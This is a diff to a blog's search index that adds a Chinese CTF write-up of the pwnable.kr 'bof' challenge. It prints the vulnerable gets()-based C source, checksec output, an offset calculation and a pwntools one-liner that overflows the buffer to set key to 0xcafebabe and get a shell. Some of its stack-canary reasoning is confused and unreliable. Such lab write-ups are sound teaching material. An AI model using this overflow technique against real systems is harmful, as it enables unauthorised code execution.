@@ -7629,4 +7629,38 @@ API网关的权限检查
         <tag>pwn</tag>
       </tags>
   </entry>
+  <entry>
+    <title>2025-11-25-BOF</title>
+    <url>/2025/11/25/2025-11-25-BOF/</url>
+    <content><![CDATA[<h3 id="EZ-BOF"><a href="#EZ-BOF" class="headerlink" title="EZ_BOF"></a>EZ_BOF</h3><p>参考题目来源：https:&#x2F;&#x2F;pwnable.kr&#x2F;play.php</p>
+<p>查看源代码</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">func</span><span class="params">(<span class="type">int</span> key)</span>&#123;</span><br><span class="line">        <span class="type">char</span> overflowme[<span class="number">32</span>]; <span class="comment">// 32位元缓冲区</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;overflow me : &quot;</span>);</span><br><span class="line">        <span class="comment">// 这里没有限制长度，随便溢</span></span><br><span class="line">        gets(overflowme);       <span class="comment">// smash me!</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">// buffer只有32字节，但后面还有：</span></span><br><span class="line">        <span class="comment">// 12字节 saved EBP（4字节）+ saved EIP（4字节）+ main传的key参数（4字节）</span></span><br><span class="line">        <span class="comment">// 所以从overflowme[0]到key总共：32 + 4 + 4 + 4 = 44字节</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 为什么是52字节A而不是44？</span></span><br><span class="line">        <span class="comment">// 因为有Stack Canary！</span></span><br><span class="line">        <span class="comment">// key这个局部变量就在栈上，我们得精确覆盖成0xcafebabe。</span></span><br><span class="line">        <span class="comment">/// 检查key是否为0xcafebabe</span></span><br><span class="line">        <span class="keyword">if</span>(key == <span class="number">0xcafebabe</span>)&#123;</span><br><span class="line">                setregid(getegid(), getegid());</span><br><span class="line">                system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Nah..\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span>&#123;</span><br><span class="line">        func(<span class="number">0xdeadbeef</span>); <span class="comment">// 初始key值不是0xcafebabe</span></span><br><span class="line">        <span class="comment">// 正常结束程序</span></span><br><span class="line">        <span class="comment">// 溢出后覆盖修改key值为0xcafebabe</span></span><br><span class="line">        <span class="comment">// func(0xcafebabe);</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>整理逻辑：</p>
+<p>初始：func(0xdeadbeef)</p>
+<p>我们需要修改为：0xcafebabe</p>
+<p>溢出点是：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> overflowme[<span class="number">32</span>];</span><br><span class="line">gets(overflowme);</span><br></pre></td></tr></table></figure>
+
+<p>经过计算是</p>
+<p>12字节 saved EBP（4字节）+ saved EIP（4字节）+ main传的key参数（4字节）</p>
+<p>但是经过检查</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bof@ubuntu:~$ checksec ./bof</span><br><span class="line">[!] Could not populate PLT: Cannot allocate 1GB memory to run Unicorn Engine</span><br><span class="line">[*] <span class="string">&#x27;/home/bof/bof&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      Canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        PIE enabled</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure>
+
+<p>发现开启了 <code>Canary found</code></p>
+<p>众所周知：<code>Canary</code> 就是 在栈上的返回地址之前放置一个随机值（canary）</p>
+<p>所以，我们需要把Canary也覆盖掉</p>
+<p>地址计算：</p>
+<p>0xffffd240 - 0xffffd208 &#x3D; 0x38（16进制） 0x38 &#x3D; 56（10进制）</p>
+<p>第一个A的地址 → key的地址 差56字节 → 52个A + 4字节魔法值。</p>
+<p>所以 exp为</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *;r=remote(<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;9000&#x27;</span>);r.sendline(<span class="number">52</span>*<span class="string">b&#x27;A&#x27;</span>+p32(<span class="number">0xcafebabe</span>));r.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>p32(0xcafebabe) 会生成<code>b&#39;\xbe\xba\xfe\xca&#39;</code></p>
+]]></content>
+      <tags>
+        <tag>网络安全</tag>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
 </search>
